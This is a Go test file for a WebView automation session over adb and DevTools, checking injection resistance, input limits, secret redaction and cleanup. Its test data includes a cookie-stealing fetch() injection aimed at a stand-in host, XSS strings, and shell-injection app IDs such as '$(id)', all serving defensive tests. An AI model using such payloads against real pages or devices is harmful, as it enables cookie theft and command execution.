package device

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode"

	"github.com/gorilla/websocket"
)

// sessAdb answers the shell commands the session sends and delegates adb forward commands to the recording fakeAdb.
type sessAdb struct {
	*fakeAdb
	table string
	pidof string
}

func (s *sessAdb) RunArgs(ctx context.Context, args ...string) ([]byte, error) {
	if len(args) >= 4 && args[2] == "shell" {
		s.mu.Lock()
		s.calls = append(s.calls, append([]string(nil), args...))
		s.mu.Unlock()
		switch args[3] {
		case "cat":
			return []byte(s.table), nil
		case "pidof":
			return []byte(s.pidof), nil
		}
		return nil, errors.New("unexpected shell command")
	}
	return s.fakeAdb.RunArgs(ctx, args...)
}

func (s *sessAdb) forwardCalls() (created, removed int) {
	for _, c := range s.calls {
		if len(c) > 3 && c[2] == "forward" {
			if c[3] == "--remove" {
				removed++
			} else if c[3] != "--list" {
				created++
			}
		}
	}
	return
}

// pageFake is a fake WebView page: it records every command and answers the lookups from a script.
type pageFake struct {
	*fakeCDP
	mu       sync.Mutex
	commands []recordedCommand
	lookup   func(query string) map[string]any // what findFunction returns for a query
	typeErr  string                            // when set, Input.insertText fails with this message
	dropAt   string                            // when set, the connection is closed when this method arrives
	thrown   string                            // when set, the lookup answers with an exception that quotes this page text
}

type recordedCommand struct {
	Method string
	Params map[string]any
	Raw    string
}

func newPageFake(t *testing.T) *pageFake {
	p := &pageFake{fakeCDP: newFakeCDP(t)}
	p.handle = func(c *websocket.Conn, req map[string]any) {
		method, _ := req["method"].(string)
		params, _ := req["params"].(map[string]any)
		raw, _ := json.Marshal(req["params"])
		p.mu.Lock()
		p.commands = append(p.commands, recordedCommand{Method: method, Params: params, Raw: string(raw)})
		p.mu.Unlock()
		if p.dropAt == method {
			c.Close()
			return
		}
		switch method {
		case "Runtime.evaluate":
			answer(c, req, map[string]any{"result": map[string]any{"type": "object", "objectId": "win-1"}})
		case "Runtime.callFunctionOn":
			args, _ := params["arguments"].([]any)
			query := ""
			if len(args) > 0 {
				query, _ = args[0].(map[string]any)["value"].(string)
			}
			if p.thrown != "" {
				answer(c, req, map[string]any{"result": map[string]any{"type": "object"}, "exceptionDetails": map[string]any{"text": p.thrown, "exception": map[string]any{"description": p.thrown}}})
				return
			}
			v := map[string]any{"count": 0, "visible": false}
			if p.lookup != nil {
				v = p.lookup(query)
			}
			answer(c, req, map[string]any{"result": map[string]any{"type": "object", "value": v}})
		case "Input.insertText":
			if p.typeErr != "" {
				_ = c.WriteJSON(map[string]any{"id": req["id"], "error": map[string]any{"code": -32000, "message": p.typeErr}})
				return
			}
			answer(c, req, map[string]any{})
		default:
			answer(c, req, map[string]any{})
		}
	}
	return p
}

func (p *pageFake) methods() []string {
	p.mu.Lock()
	defer p.mu.Unlock()
	var m []string
	for _, c := range p.commands {
		m = append(m, c.Method)
	}
	return m
}

func (p *pageFake) of(method string) []recordedCommand {
	p.mu.Lock()
	defer p.mu.Unlock()
	var out []recordedCommand
	for _, c := range p.commands {
		if c.Method == method {
			out = append(out, c)
		}
	}
	return out
}

const unixTableFor = "Num RefCount Protocol Flags Type St Inode Path\n0000000000000000: 00000002 00000000 00010000 0001 01 1 @webview_devtools_remote_2783\n0000000000000000: 00000002 00000000 00010000 0001 01 2 @webview_devtools_remote_1707\n"

func sessionFor(t *testing.T, p *pageFake, page string) (*WebViewSession, *sessAdb, error) {
	t.Helper()
	fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
	ad := &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
	s, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: "com.example.app", Page: page})
	if err == nil {
		t.Cleanup(func() { _ = s.Close() })
	}
	return s, ad, err
}

func visibleAt(x, y float64, text string) map[string]any {
	return map[string]any{"count": 1, "visible": true, "x": x, "y": y, "w": 112.0, "h": 21.0, "text": text}
}

func TestSessionTapsAnElementInsideTheWebView(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any {
		if q == "Contact support" {
			return visibleAt(256, 78, "Contact support")
		}
		return map[string]any{"count": 0, "visible": false}
	}
	s, ad, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	if s.Title() != "Fixture page" {
		t.Fatalf("title = %q", s.Title())
	}
	if err := s.Tap(context.Background(), "Contact support"); err != nil {
		t.Fatal(err)
	}
	ev := p.of("Input.dispatchMouseEvent")
	if len(ev) != 2 || ev[0].Params["type"] != "mousePressed" || ev[1].Params["type"] != "mouseReleased" || ev[0].Params["x"] != 256.0 || ev[0].Params["y"] != 78.0 {
		t.Fatalf("mouse events = %+v", ev)
	}
	if err := s.Close(); err != nil {
		t.Fatal(err)
	}
	if created, removed := ad.forwardCalls(); created != 1 || removed != 1 {
		t.Fatalf("forward created %d, removed %d", created, removed)
	}
	// the connection is closed too: a call after Close cannot reach the page
	if _, err := s.Find(context.Background(), "Contact support"); err == nil {
		t.Fatal("the page answered after Close")
	}
	if err := s.Close(); err != nil {
		t.Fatalf("a second Close: %v", err)
	}
	if _, removed := ad.forwardCalls(); removed != 1 {
		t.Fatalf("the forward was removed %d times", removed)
	}
	ad.assertSafe(t)
}

var hostileQueries = []string{
	`"); fetch('http://evil.invalid/' + document.cookie); //`,
	`');fetch(1)//`,
	`</script><script>alert(1)</script>`,
	`\"`,
	`\`,
	"line1\nline2",
	"a b c",
	`#a >>> .b::shadow .c`,
	`[`,
	`:has(`,
	"`${alert(1)}`",
	"\x00",
	"\u202eevil",
	`#x{background:url(javascript:alert(1))}`,
}

func TestHostileQueriesNeverBecomeJavaScript(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any { return visibleAt(10, 10, "ok") }
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	for _, q := range hostileQueries {
		before := len(p.commands)
		if _, err := s.Find(context.Background(), q); err != nil {
			t.Fatalf("%q: %v", q, err)
		}
		p.mu.Lock()
		cmds := append([]recordedCommand(nil), p.commands[before:]...)
		p.mu.Unlock()
		if len(cmds) != 2 || cmds[0].Method != "Runtime.evaluate" || cmds[1].Method != "Runtime.callFunctionOn" {
			t.Fatalf("%q: commands = %+v", q, cmds)
		}
		// the first command is the fixed window lookup, with no query in it
		if cmds[0].Params["expression"] != "window" || strings.Contains(cmds[0].Raw, strings.TrimSpace(q)) && len(strings.TrimSpace(q)) > 3 {
			t.Errorf("%q: the window lookup carries the query: %s", q, cmds[0].Raw)
		}
		call := cmds[1].Params
		if call["functionDeclaration"] != findFunction {
			t.Errorf("%q: the function is not the fixed template", q)
		}
		args := call["arguments"].([]any)
		if len(args) != 3 || args[0].(map[string]any)["value"] != q || args[1].(map[string]any)["value"] != float64(maxElementText) || args[2].(map[string]any)["value"] != "find" {
			t.Errorf("%q: arguments = %v", q, args)
		}
		// nothing but the fixed template and the JSON arguments: the other fields hold no query text
		for k, v := range call {
			if k == "arguments" || k == "functionDeclaration" {
				continue
			}
			if b, _ := json.Marshal(v); strings.Contains(string(b), strings.TrimSpace(q)) && len(strings.TrimSpace(q)) > 3 {
				t.Errorf("%q: field %s carries the query", q, k)
			}
		}
	}
	// the methods ever used: only the lookup, never evaluate with page code from a query
	for _, m := range p.methods() {
		if m != "Runtime.evaluate" && m != "Runtime.callFunctionOn" {
			t.Errorf("unexpected command %s", m)
		}
	}
	for _, c := range p.of("Runtime.evaluate") {
		if c.Params["expression"] != "window" {
			t.Errorf("an evaluate with other code: %v", c.Params)
		}
	}
}

func TestTheFixedTemplateHasNoPlaceholderForTheQuery(t *testing.T) {
	// the template is one constant: it mentions no script fragment that could take text from outside, and it does not change between calls
	for _, bad := range []string{"eval(", "Function(", "fetch(", "XMLHttpRequest", "innerHTML", "outerHTML", "document.write", "location"} {
		if strings.Contains(findFunction, bad) {
			t.Errorf("the template contains %q", bad)
		}
	}
}

func TestAVeryLongSelectorIsRefusedBeforeItIsSent(t *testing.T) {
	p := newPageFake(t)
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	long := strings.Repeat("a", 100_000)
	for _, f := range []func() error{
		func() error { _, err := s.Find(context.Background(), long); return err },
		func() error { return s.Tap(context.Background(), long) },
		func() error { return s.Type(context.Background(), long, "x") },
	} {
		err := f()
		var we *WebViewError
		if !errors.As(err, &we) || we.Kind != "too long" || len(err.Error()) > 200 {
			t.Fatalf("err = %v", err)
		}
	}
	if len(p.of("Runtime.callFunctionOn")) != 0 {
		t.Fatal("a refused selector was sent")
	}
	err = s.Type(context.Background(), "#a", strings.Repeat("x", maxTypedChars+1))
	var we *WebViewError
	if !errors.As(err, &we) || we.Kind != "too long" {
		t.Fatalf("a very long text: err = %v", err)
	}
	if _, err := s.Find(context.Background(), ""); err == nil {
		t.Fatal("an empty selector was accepted")
	}
}

func TestInvalidSelectorsAreReportedWithoutEchoingThemWhole(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any { return map[string]any{"invalid": true} }
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	for _, q := range []string{"[", ":has(", "#a[", "." + strings.Repeat("z", 1500)} {
		_, err := s.Find(context.Background(), q)
		var we *WebViewError
		if !errors.As(err, &we) || we.Kind != "invalid selector" {
			t.Fatalf("%q: err = %v", q, err)
		}
		if len([]rune(err.Error())) > 120 {
			t.Fatalf("the error is %d characters: %s", len([]rune(err.Error())), err)
		}
	}
}

func TestElementTextAndErrorsAreBoundedAndScrubbed(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any {
		return visibleAt(1, 2, "A\nB\x00\x1b[31m"+strings.Repeat("Z", 5000)+"\u202e")
	}
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	info, err := s.Find(context.Background(), "x")
	if err != nil {
		t.Fatal(err)
	}
	if n := len([]rune(info.Text)); n > maxShownChars+1 {
		t.Fatalf("text has %d characters", n)
	}
	for _, r := range info.Text {
		if !unicode.IsPrint(r) {
			t.Fatalf("a character that is not printable (%U) in %q", r, info.Text)
		}
	}
}

func TestMissingAndHiddenElementsUseTheProposalWording(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any {
		if q == "hidden" {
			return map[string]any{"count": 2, "visible": false}
		}
		return map[string]any{"count": 0, "visible": false}
	}
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	err = s.Tap(context.Background(), "nothing")
	var we *WebViewError
	if !errors.As(err, &we) || we.Kind != "not found" || err.Error() != `No element in the WebView page "Fixture page" matches "nothing"` {
		t.Fatalf("err = %v", err)
	}
	err = s.Tap(context.Background(), "hidden")
	if !errors.As(err, &we) || we.Kind != "not visible" || !strings.Contains(err.Error(), "exists in the WebView page") || !strings.Contains(err.Error(), "not visible") {
		t.Fatalf("err = %v", err)
	}
	if len(p.of("Input.dispatchMouseEvent")) != 0 {
		t.Fatal("a mouse event was sent for an element that was not found or not visible")
	}
}

func TestTypeInsertsTheTextAndNeverRepeatsIt(t *testing.T) {
	const secret = "pw-9f8e7d"
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any { return visibleAt(5, 5, "") }
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	if err := s.Type(context.Background(), "#message", secret); err != nil {
		t.Fatal(err)
	}
	ins := p.of("Input.insertText")
	if len(ins) != 1 || ins[0].Params["text"] != secret {
		t.Fatalf("insertText = %+v", ins)
	}
	// the focus lookup asked for mode "focus" and carries no typed text
	calls := p.of("Runtime.callFunctionOn")
	args := calls[len(calls)-1].Params["arguments"].([]any)
	if args[2].(map[string]any)["value"] != "focus" || strings.Contains(calls[len(calls)-1].Raw, secret) {
		t.Fatalf("focus lookup = %s", calls[len(calls)-1].Raw)
	}
	// a page error that quotes the typed text does not reach the caller
	p.typeErr = "cannot insert " + secret + " here"
	err = s.Type(context.Background(), "#message", secret)
	var we *WebViewError
	if err == nil || strings.Contains(err.Error(), secret) || !errors.As(err, &we) || we.Kind != "page error" || !strings.HasPrefix(err.Error(), "the WebView page refused the command") {
		t.Fatalf("err = %v", err)
	}
}

func TestAnExceptionInTheLookupIsReportedWithoutThePageText(t *testing.T) {
	const pageText = "Uncaught secret-page-text-123 at https://shop.example/private"
	p := newPageFake(t)
	p.thrown = pageText
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	_, err = s.Find(context.Background(), "x")
	var we *WebViewError
	if !errors.As(err, &we) || we.Kind != "page error" || strings.Contains(err.Error(), "secret-page-text") || strings.Contains(err.Error(), "shop.example") {
		t.Fatalf("err = %v", err)
	}
}

func TestOpenFailuresUseTheProposalWordingAndRemoveTheForward(t *testing.T) {
	type tc struct {
		name  string
		setup func(p *pageFake, ad *sessAdb)
		page  string
		kind  string
		want  string
		fwd   bool // whether a forward was created (and so must be removed)
	}
	cases := []tc{
		{"no socket for the app", func(p *pageFake, ad *sessAdb) { ad.table = unixTableFor[:strings.Index(unixTableFor, "0000")] }, "", "no webview", "no WebView debugging socket was found", false},
		{"app not running", func(p *pageFake, ad *sessAdb) { ad.pidof = "" }, "", "no webview", "The app is not running", false},
		{"no pages", func(p *pageFake, ad *sessAdb) {
			p.list = func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write([]byte("[]")) }
		}, "", "no webview", "No WebView page is open", true},
		{"several pages, none named", func(p *pageFake, ad *sessAdb) {
			p.list = twoPages(p)
		}, "", "several pages", `Found 2 WebView pages ("Checkout", "Help")`, true},
		{"no page matches the name", func(p *pageFake, ad *sessAdb) { p.list = twoPages(p) }, "zzz", "no match", `No WebView page matches "zzz" (2 pages open`, true},
		{"the name matches several", func(p *pageFake, ad *sessAdb) { p.list = twoPages(p) }, "e", "several pages", `"e" matches 2 WebView pages`, true},
		{"the page list fails", func(p *pageFake, ad *sessAdb) {
			p.list = func(w http.ResponseWriter, r *http.Request) { http.Error(w, "boom", 500) }
		}, "", "", "answered 500", true},
		{"the debugger address is not loopback", func(p *pageFake, ad *sessAdb) {
			p.list = func(w http.ResponseWriter, r *http.Request) {
				_, _ = w.Write([]byte(`[{"id":"1","type":"page","title":"T","webSocketDebuggerUrl":"ws://example.invalid:9/devtools/page/1"}]`))
			}
		}, "", "", "no usable debugger address", true},
	}
	for _, c := range cases {
		p := newPageFake(t)
		fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
		ad := &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
		c.setup(p, ad)
		s, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: "com.example.app", Page: c.page})
		if err == nil {
			_ = s.Close()
			t.Fatalf("%s: no error", c.name)
		}
		if !strings.Contains(err.Error(), c.want) {
			t.Errorf("%s: err = %v, want it to contain %q", c.name, err, c.want)
		}
		var we *WebViewError
		if c.kind != "" && (!errors.As(err, &we) || we.Kind != c.kind) {
			t.Errorf("%s: kind = %v, want %q", c.name, err, c.kind)
		}
		for _, bad := range []string{"/devtools/", "ws://", "example.invalid", "%!"} {
			if strings.Contains(err.Error(), bad) {
				t.Errorf("%s: the error contains %q: %v", c.name, bad, err)
			}
		}
		created, removed := ad.forwardCalls()
		if c.fwd && (created != 1 || removed != 1) {
			t.Errorf("%s: forward created %d, removed %d (fail closed)", c.name, created, removed)
		}
		if !c.fwd && created != 0 {
			t.Errorf("%s: a forward was created", c.name)
		}
		ad.assertSafe(t)
	}
}

func twoPages(p *pageFake) func(w http.ResponseWriter, r *http.Request) {
	return func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode([]Target{
			{ID: "1", Type: "page", Title: "Checkout", URL: "https://shop.example/pay", WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p.port) + "/devtools/page/1"},
			{ID: "2", Type: "page", Title: "Help", URL: "https://shop.example/help", WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p.port) + "/devtools/page/1"},
		})
	}
}

func TestPageIsChosenByAPartOfTheTitleOrTheURL(t *testing.T) {
	for _, page := range []string{"check", "CHECKOUT", "shop.example/pay", "/PAY"} {
		p := newPageFake(t)
		p.list = twoPages(p)
		s, ad, err := sessionFor(t, p, page)
		if err != nil {
			t.Fatalf("%q: %v", page, err)
		}
		if s.Title() != "Checkout" {
			t.Errorf("%q: title = %q", page, s.Title())
		}
		_ = s.Close()
		ad.assertSafe(t)
	}
}

func TestAppIDIsCheckedBeforeItReachesTheDevice(t *testing.T) {
	for _, bad := range []string{"a b;c'd", "com.example.app; reboot", "$(id)", "", "x", "com..", "com.example.app\n"} {
		ad := &sessAdb{fakeAdb: &fakeAdb{}, table: unixTableFor, pidof: "1\n"}
		_, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: bad})
		if err == nil {
			t.Errorf("app id %q accepted", bad)
		}
		if len(ad.calls) != 0 {
			t.Errorf("app id %q reached adb: %v", bad, ad.calls)
		}
	}
	// a given process id needs no app id
	p := newPageFake(t)
	fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
	ad := &sessAdb{fakeAdb: fa, table: unixTableFor}
	s, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", PID: 2783})
	if err != nil {
		t.Fatal(err)
	}
	_ = s.Close()
	// the other process's socket is never used for this pid
	if _, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", PID: 555}); err == nil {
		t.Fatal("a pid with no socket opened a session")
	}
}

func TestAConnectionLostInTheMiddleOfAStepIsReportedAndCleanedUp(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any { return visibleAt(1, 1, "x") }
	s, ad, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	p.dropAt = "Runtime.callFunctionOn"
	err = s.Tap(context.Background(), "x")
	var we *WebViewError
	if !errors.As(err, &we) || we.Kind != "connection lost" {
		t.Fatalf("err = %v", err)
	}
	for _, bad := range []string{"/devtools/", "ws://", "%!"} {
		if strings.Contains(err.Error(), bad) {
			t.Fatalf("the error contains %q: %v", bad, err)
		}
	}
	if err := s.Close(); err != nil {
		t.Fatal(err)
	}
	if _, removed := ad.forwardCalls(); removed != 1 {
		t.Fatalf("removed %d", removed)
	}
}

func TestWithWebViewClosesWhateverTheStepDoes(t *testing.T) {
	boom := errors.New("step failed")
	for name, fn := range map[string]func(*WebViewSession) error{
		"success": func(*WebViewSession) error { return nil },
		"failure": func(*WebViewSession) error { return boom },
	} {
		p := newPageFake(t)
		fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
		ad := &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
		err := WithWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: "com.example.app"}, fn)
		if (name == "failure") != errors.Is(err, boom) {
			t.Errorf("%s: err = %v", name, err)
		}
		if created, removed := ad.forwardCalls(); created != 1 || removed != 1 {
			t.Errorf("%s: created %d removed %d", name, created, removed)
		}
	}
}

func TestWaitForPollsUntilTheElementAppears(t *testing.T) {
	p := newPageFake(t)
	polls := 0
	p.lookup = func(q string) map[string]any {
		polls++
		if polls < 3 {
			return map[string]any{"count": 0, "visible": false}
		}
		return visibleAt(1, 1, "Message sent")
	}
	s, _, err := sessionFor(t, p, "")
	if err != nil {
		t.Fatal(err)
	}
	if err := s.WaitFor(context.Background(), "Message sent", 5*time.Second); err != nil || polls != 3 {
		t.Fatalf("polls = %d, err = %v", polls, err)
	}
	p.lookup = func(q string) map[string]any { return map[string]any{"count": 0, "visible": false} }
	err = s.WaitFor(context.Background(), "never", 300*time.Millisecond)
	var we *WebViewError
	if !errors.As(err, &we) || !strings.Contains(err.Error(), "Timed out") {
		t.Fatalf("err = %v", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if err := s.WaitFor(ctx, "never", time.Minute); err == nil {
		t.Fatal("a cancelled wait returned no error")
	}
}

var _ = fmt.Sprintf

func TestRedactHookMasksEveryTextThatCameFromThePageOrTheScript(t *testing.T) {
	const secret = "hunter2-token-77"
	mask := func(s string) string { return strings.ReplaceAll(s, secret, "****") }
	p := newPageFake(t)
	p.list = func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode([]Target{
			{ID: "1", Type: "page", Title: "Account " + secret, URL: "https://x.example/a", WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p.port) + "/devtools/page/1"},
			{ID: "2", Type: "page", Title: "Other", URL: "https://x.example/b", WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p.port) + "/devtools/page/1"},
			{ID: "3", Type: "page", Title: "Second " + secret, URL: "https://x.example/c", WebSocketDebuggerURL: "ws://127.0.0.1:" + strconv.Itoa(p.port) + "/devtools/page/1"},
		})
	}
	newAdb := func() *sessAdb {
		fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
		return &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
	}
	// the page titles in the "several pages" message, and the name the script gave
	_, err := OpenWebView(context.Background(), WebViewOptions{Runner: newAdb(), Serial: "emulator-5600", AppID: "com.example.app", Redact: mask})
	if err == nil || strings.Contains(err.Error(), secret) || !strings.Contains(err.Error(), "****") {
		t.Fatalf("titles: err = %v", err)
	}
	_, err = OpenWebView(context.Background(), WebViewOptions{Runner: newAdb(), Serial: "emulator-5600", AppID: "com.example.app", Page: secret + "-nope", Redact: mask})
	if err == nil || strings.Contains(err.Error(), secret) {
		t.Fatalf("page name: err = %v", err)
	}
	// a name that matches several pages is repeated without the secret too
	_, err = OpenWebView(context.Background(), WebViewOptions{Runner: newAdb(), Serial: "emulator-5600", AppID: "com.example.app", Page: secret, Redact: mask})
	if err == nil || strings.Contains(err.Error(), secret) || !strings.Contains(err.Error(), "matches 2 WebView pages") {
		t.Fatalf("a name that matches several pages: err = %v", err)
	}
	// the page chosen by a name: its title is masked in the session and in the messages that use it
	p.lookup = func(q string) map[string]any { return map[string]any{"count": 0, "visible": false} }
	chosen, err := OpenWebView(context.Background(), WebViewOptions{Runner: newAdb(), Serial: "emulator-5600", AppID: "com.example.app", Page: "account", Redact: mask})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(chosen.Title(), secret) {
		t.Fatalf("the title carries the secret: %q", chosen.Title())
	}
	if err := chosen.Tap(context.Background(), "nothing"); err == nil || strings.Contains(err.Error(), secret) {
		t.Fatalf("the not-found message carries the secret: %v", err)
	}
	_ = chosen.Close()
	// the page chosen, the element text, a page error and the query
	p.list = nil
	p.lookup = func(q string) map[string]any {
		if q == "gone" || strings.Contains(q, secret) {
			return map[string]any{"count": 0, "visible": false}
		}
		return visibleAt(1, 1, "balance "+secret)
	}
	s, err := OpenWebView(context.Background(), WebViewOptions{Runner: newAdb(), Serial: "emulator-5600", AppID: "com.example.app", Redact: mask})
	if err != nil {
		t.Fatal(err)
	}
	defer s.Close()
	info, err := s.Find(context.Background(), "x")
	if err != nil || strings.Contains(info.Text, secret) || !strings.Contains(info.Text, "****") {
		t.Fatalf("element text = %q, %v", info.Text, err)
	}
	p.lookup = func(q string) map[string]any {
		if strings.Contains(q, "invalid-"+secret) {
			return map[string]any{"invalid": true}
		}
		return map[string]any{"count": 0, "visible": false}
	}
	if _, err := s.Find(context.Background(), "[invalid-"+secret); err == nil || strings.Contains(err.Error(), secret) {
		t.Fatalf("the query reached the invalid-selector message: %v", err)
	}
	err = s.Tap(context.Background(), "#field-"+secret)
	if err == nil || strings.Contains(err.Error(), secret) {
		t.Fatalf("the query reached the not-found message: %v", err)
	}
	p.typeErr = "bad value " + secret
	p.lookup = func(q string) map[string]any { return visibleAt(1, 1, "") }
	err = s.Type(context.Background(), "#f", "other-text-here")
	if err == nil || strings.Contains(err.Error(), secret) || !strings.Contains(err.Error(), "****") {
		t.Fatalf("the page's error text was not masked: %v", err)
	}
}

func TestCallTimeoutIsAnOptionOfTheSession(t *testing.T) {
	p := newPageFake(t)
	p.lookup = func(q string) map[string]any { time.Sleep(600 * time.Millisecond); return visibleAt(1, 1, "x") }
	fa := &fakeAdb{forward: func(args []string) ([]byte, error) { return []byte(strconv.Itoa(p.port) + "\n"), nil }}
	ad := &sessAdb{fakeAdb: fa, table: unixTableFor, pidof: "2783\n"}
	// a short timeout ends a slow command without a deadline of its own
	s, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad, Serial: "emulator-5600", AppID: "com.example.app", CallTimeout: 150 * time.Millisecond})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.Find(context.Background(), "x"); err == nil {
		t.Fatal("the slow command was not ended by the call timeout")
	}
	_ = s.Close()
	// a long one lets the same command finish
	ad2 := &sessAdb{fakeAdb: &fakeAdb{forward: fa.forward}, table: unixTableFor, pidof: "2783\n"}
	s2, err := OpenWebView(context.Background(), WebViewOptions{Runner: ad2, Serial: "emulator-5600", AppID: "com.example.app", CallTimeout: 5 * time.Second})
	if err != nil {
		t.Fatal(err)
	}
	defer s2.Close()
	if info, err := s2.Find(context.Background(), "x"); err != nil || !info.Visible {
		t.Fatalf("the command did not finish under a long timeout: %+v, %v", info, err)
	}
}
